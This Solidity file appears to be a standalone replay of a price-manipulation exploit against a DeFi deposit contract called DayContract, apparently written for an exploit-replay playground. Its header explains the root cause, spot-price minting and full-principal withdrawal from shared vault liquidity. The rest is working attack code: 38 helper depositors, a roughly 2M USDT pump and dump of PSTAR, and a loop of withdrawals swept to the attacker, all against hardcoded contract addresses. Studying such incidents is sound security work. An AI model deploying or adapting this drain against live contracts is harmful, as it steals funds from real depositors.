// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Synthetic standalone exploit for the EVM Playground (2026-03-DayContract).
// The registry Foundry test (test/DayContract_exp.sol) runs the attack INLINE
// on the test contract with `deal(USDT, …)` as flash-loan capital and deploys
// 38 DayHelper depositors. This is a self-contained copy: capital is dealt
// into this contract via setup.dealToken before run().
//
// Root cause: DayContract.deposit mints LP against Pancake SPOT reserves (no
// TWAP). withdraw always calls vault.settlePrincipal(full principal), and the
// vault's _ensureUSDTBalance redeems SHARED vault LP until it can pay — ignoring
// the order's own post-manipulation NAV. Same-tx deposit→manip→withdraw is
// allowed, so inflated-spot deposits withdraw full face value after the dump.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDayContract {
    function deposit(uint256 amount) external;
    function withdraw(uint256 orderId) external;
}

interface IReferral {
    function register(address referrer) external;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

// Each helper is a separate registered depositor (mirrors live multi-helper design).
contract DayHelper {
    address immutable day;
    address immutable usdt;
    address immutable referral;
    address immutable sponsor;

    constructor(address day_, address usdt_, address referral_, address sponsor_) {
        day = day_;
        usdt = usdt_;
        referral = referral_;
        sponsor = sponsor_;
        IReferral(referral_).register(sponsor_);
    }

    function deposit(uint256 amount) external {
        IERC20(usdt).approve(day, amount);
        IDayContract(day).deposit(amount);
    }

    function withdraw(uint256 orderId) external {
        IDayContract(day).withdraw(orderId);
    }

    function sweep(address token, address to) external {
        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal > 0) IERC20(token).transfer(to, bal);
    }
}

contract DayContractDrain {
    address constant DAY = 0x587984549f7E61C0ED8131B1F6614F592573a43C;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant PSTAR = 0xa0d94224E5434471638b82985aF61B79109E09f5;
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant REFERRAL = 0x50481E67dDc47c21Ab8d64f2350748b88646A615;
    // Already registered + hasDeposited — valid sponsor for new registrants.
    address constant SPONSOR = 0xB08dFCE61875d282B2dc022ff471c2Da5d1bbF58;

    uint256 constant DEPOSIT_EACH = 1_000 ether;
    uint256 constant NUM_HELPERS = 38;
    uint256 constant MANIP_USDT = 2_000_000 ether;

    // Recorded attack. USDT capital is pre-dealt onto this contract via setup.
    function run() external {
        // Register the main attacker under a live depositor so helpers can chain.
        IReferral(REFERRAL).register(SPONSOR);

        DayHelper[] memory helpers = new DayHelper[](NUM_HELPERS);
        for (uint256 i = 0; i < NUM_HELPERS; i++) {
            helpers[i] = new DayHelper(DAY, USDT, REFERRAL, SPONSOR);
            require(IERC20(USDT).transfer(address(helpers[i]), DEPOSIT_EACH), "fund helper");
        }

        // Two fair-price deposits first (matches public write-up sequencing).
        helpers[0].deposit(DEPOSIT_EACH);
        helpers[1].deposit(DEPOSIT_EACH);

        // Spike PSTAR by buying with ~2M USDT.
        IERC20(USDT).approve(ROUTER, type(uint256).max);
        address[] memory buyPath = new address[](2);
        buyPath[0] = USDT;
        buyPath[1] = PSTAR;
        IRouter(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            MANIP_USDT, 0, buyPath, address(this), block.timestamp
        );
        uint256 pstarBal = IERC20(PSTAR).balanceOf(address(this));

        // Remaining 36 deposits at inflated spot → tiny fair NAV after unwind.
        for (uint256 i = 2; i < NUM_HELPERS; i++) {
            helpers[i].deposit(DEPOSIT_EACH);
        }

        // Unwind manip: dump PSTAR back to USDT.
        IERC20(PSTAR).approve(ROUTER, type(uint256).max);
        address[] memory sellPath = new address[](2);
        sellPath[0] = PSTAR;
        sellPath[1] = USDT;
        IRouter(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            pstarBal, 0, sellPath, address(this), block.timestamp
        );

        // Withdraw all orders — vault pays full principal by liquidating shared LP.
        for (uint256 i = 0; i < NUM_HELPERS; i++) {
            helpers[i].withdraw(0);
            helpers[i].sweep(USDT, address(this));
        }
    }
}
